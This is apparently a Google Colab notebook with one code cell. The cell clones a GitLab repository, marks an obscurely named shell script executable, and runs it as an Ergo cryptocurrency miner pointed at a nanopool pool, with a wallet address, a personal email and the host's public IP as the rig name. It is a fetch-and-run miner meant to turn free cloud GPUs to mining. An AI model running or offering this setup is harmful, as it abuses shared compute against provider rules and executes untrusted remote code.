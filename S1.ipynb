{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "S1.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [
        "VZM6Yd3T8BD5H"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "VZM6Yd3T8BD5H"
      },
      "source": [
        "!nvidia-smi\n",
        "!git clone https://gitlab.com/pulangkampung52/awh.git\n",
        "%cd awh\n",
        "!chmod +x ngawor.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./ngawor.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11433 -wallet 9fxFC5p185A7LVRN8VGPuPSkPM9HFTTCp2WA7hsEjWHwHXLsCWq -coin ergo -rigName $ip -email andiok6@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}